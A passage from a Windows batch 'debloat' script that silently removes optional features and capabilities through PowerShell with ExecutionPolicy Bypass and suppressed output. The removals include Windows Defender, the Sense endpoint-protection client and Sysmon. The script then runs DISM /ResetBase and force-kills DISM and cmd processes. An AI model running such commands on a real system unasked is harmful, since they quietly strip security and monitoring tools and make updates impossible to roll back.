PServer','IIS-FTPSvc','IIS-HealthAndDiagnostics','IIS-HostableWebCore','IIS-HttpCompressionDynamic','IIS-HttpCompressionStatic','IIS-HttpErrors','IIS-HttpLogging','IIS-HttpRedirect','IIS-HttpTracing','IIS-IIS6ManagementCompatibility','IIS-IISCertificateMappingAuthentication','IIS-IPSecurity','IIS-ISAPIExtensions','IIS-ISAPIFilter','IIS-LoggingLibraries','IIS-ManagementConsole','IIS-ManagementScriptingTools','IIS-ManagementService','IIS-Metabase','IIS-NetFxExtensibility45','IIS-ODBCLogging','IIS-Performance','IIS-RequestFiltering','IIS-RequestMonitor','IIS-Security','IIS-ServerSideIncludes','IIS-StaticContent','IIS-URLAuthorization','IIS-WebDAV','IIS-WebServerManagementTools','IIS-WebServer','IIS-WebServerRole','IIS-WebSockets','IIS-WindowsAuthentication','IIS-WMICompatibility','Internet-Explorer-Optional-amd64','Language.Basic','Language.Handwriting','Language.OCR','Language.Speech','Language.TextToSpeech','MathRecognizer','MediaPlayback','Media.WindowsMediaPlayer','Microsoft-Hyper-V-All','Microsoft-Hyper-V-Hypervisor','Microsoft-Hyper-V-Management-Clients','Microsoft-Hyper-V-Management-PowerShell','Microsoft-Hyper-V','Microsoft-Hyper-V-Services','Microsoft-Hyper-V-Tools-All','Microsoft-RemoteDesktopConnection','Microsoft.Wallpapers.Extended','Microsoft.Windows.Ethernet.Client.Vmware.Vmxnet3','Microsoft.Windows.PowerShell.ISE','MicrosoftWindowsPowerShellV2','MicrosoftWindowsPowerShellV2Root','Microsoft-Windows-Subsystem-Linux','MSMQ-ADIntegration','MSMQ-Container','MSMQ-DCOMProxy','MSMQ-HTTP','MSMQ-Multicast','MSMQ-Server','MSMQ-Triggers','MSRDC-Infrastructure','MultiPoint-Connector','MultiPoint-Connector-Services','MultiPoint-Tools','NetFx4Extended-ASPNET45','NFS-Administration','OneCoreUAP.OneSync','Printing-Foundation-Features','Printing-Foundation-InternetPrinting-Client','Printing-Foundation-LPDPrintService','Printing-Foundation-LPRPortMonitor','Printing-PrintToPDFServices-Features','Printing-XPSServices-Features','RasRip','recall','SearchEngine-Client-Package','ServicesForNFS-ClientOnly','SimpleTCP','SMB1Protocol-Client','SMB1Protocol-Deprecation','SMB1Protocol','SMB1Protocol-Server','SmbDirect','SNMP','StepsRecorder','Sysmon','TelnetClient','TelnetServer','TFTP','TIFFIFilter','VirtualMachinePlatform','WAS-ConfigurationAPI','WAS-NetFxEnvironment','WAS-ProcessModel','WAS-WindowsActivationService','WCF-HTTP-Activation45','WCF-HTTP-Activation','WCF-MSMQ-Activation45','WCF-NonHTTP-Activation','WCF-Pipe-Activation45','WCF-Services45','WCF-TCP-Activation45','WCF-TCP-PortSharing45','Windows-Defender-ApplicationGuard','Windows-Defender-Default-Definitions','Windows-Defender-Features','Windows-Defender-Gui','Windows-Defender','Windows.DirectoryServices.ADAM.Client.Content','Windows.HyperV.OptionalFeature.VirtualMachinePlatform.Client.Disabled','Windows-Identity-Foundation','Windows.Kernel.LA57','WindowsMediaPlayer','WindowsMixedReality','Windows.SimpleTCP.Content','Windows.SmbDirect','Windows.TFTP.Client','Windows.WinOcr','Windows.WorkFolders.Client','WMISnmpProvider','WorkFolders-Client','Xps-Foundation-Xps-Viewer','Internet-Explorer-Optional-x64','Internet-Explorer-Optional-x86','ScanManagementConsole');foreach($f in $features){Disable-WindowsOptionalFeature -Online -FeatureName $f -Remove -NoRestart -ErrorAction SilentlyContinue}" >nul 2>&1
::capabilities
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$caps=@('Accessibility.Braille','Analog.Holographic.Desktop','App.StepsRecorder','App.Support.QuickAssist','App.WirelessDisplay.Connect','Browser.InternetExplorer','Hello.Face.20134','MathRecognizer','Microsoft.OneCore.StorageManagement','Microsoft.WebDriver','Microsoft.Windows.PowerShell.ISE','Microsoft.Windows.Sense.Client','Microsoft.Windows.Wifi.Client.Realtek.Rtl8192se','Microsoft.Windows.Wifi.Client.Realtek.Rtwlane','Microsoft.Windows.Wifi.Client.Realtek.Rtwlane01','Microsoft.Windows.Wifi.Client.Realtek.Rtwlane13','Msix.PackagingTool.Driver','Network.Irda','OneCoreUAP.OneSync','OpenSSH.Client','OpenSSH.Server','Print.EnterpriseCloudPrint','Print.Fax.Scan','Rsat.HyperV.Tools','Print.Management.Console','Print.MopriaCloudService','Rsat.ActiveDirectory.DS-LDS.Tools','Rsat.BitLocker.Recovery.Tools','Rsat.CertificateServices.Tools','Rsat.DHCP.Tools','Rsat.Dns.Tools','Rsat.FailoverCluster.Management.Tools','Rsat.FileServices.Tools','Rsat.GroupPolicy.Management.Tools','Rsat.IPAM.Client.Tools','Rsat.LLDP.Tools','Rsat.NetworkController.Tools','Rsat.NetworkLoadBalancing.Tools','Rsat.RemoteAccess.Management.Tools','Rsat.ServerManager.Tools','Rsat.Shielded.VM.Tools','Rsat.StorageMigrationService.Management.Tools','Rsat.StorageReplica.Tools','Rsat.SystemInsights.Management.Tools','Rsat.VolumeActivation.Tools','Rsat.WSUS.Tools','Tools.DeveloperMode.Core','Windows.Desktop.EMS-SAC.Tools','Windows.Kernel.LA57','XPS.Viewer','Media.WindowsMediaPlayer','Microsoft.Wallpapers.Extended','Microsoft.Windows.Ethernet.Client.Intel.E2f68','Microsoft.Windows.Wifi.Client.Broadcom.Bcmwl63al','Microsoft.Windows.Wifi.Client.Broadcom.Bcmwl63a','Microsoft.Windows.Wifi.Client.Intel.Netwbw02','Microsoft.Windows.Wifi.Client.Intel.Netwew00','Microsoft.Windows.Wifi.Client.Intel.Netwew01','Microsoft.Windows.Wifi.Client.Intel.Netwlv64','Microsoft.Windows.Wifi.Client.Intel.Netwns64','Microsoft.Windows.Wifi.Client.Intel.Netwsw00','Microsoft.Windows.Wifi.Client.Intel.Netwtw02','Microsoft.Windows.Wifi.Client.Intel.Netwtw04','Microsoft.Windows.Wifi.Client.Intel.Netwtw06','Microsoft.Windows.Wifi.Client.Intel.Netwtw08','Microsoft.Windows.Wifi.Client.Intel.Netwtw10','Microsoft.Windows.Wifi.Client.Marvel.Mrvlpcie8897','Microsoft.Windows.Wifi.Client.Qualcomm.Athw8x','Microsoft.Windows.Wifi.Client.Qualcomm.Athwnx','Microsoft.Windows.Wifi.Client.Qualcomm.Qcamain10x64','Microsoft.Windows.Wifi.Client.Ralink.Netr28x');$allC=Get-WindowsCapability -Online -ErrorAction SilentlyContinue;foreach($c in $caps){$allC | Where-Object {$_.Name -like \"$c*\"} | Remove-WindowsCapability -Online -ErrorAction SilentlyContinue}" >nul 2>&1
DISM /Online /Set-ReservedStorageState /State:Disabled /NoRestart >NUL 2>&1
DISM /Online /Cleanup-Image /StartComponentCleanup /ResetBase >NUL 2>&1
taskkill /f /t /im Dism.exe >NUL 2>&1
taskkill /f /t /im DismHost.exe >NUL 2>&1
taskkill /f /t /im conhost.exe >NUL 2>&1
taskkill /f /t /im cmd.exe >NUL 2>&1
exit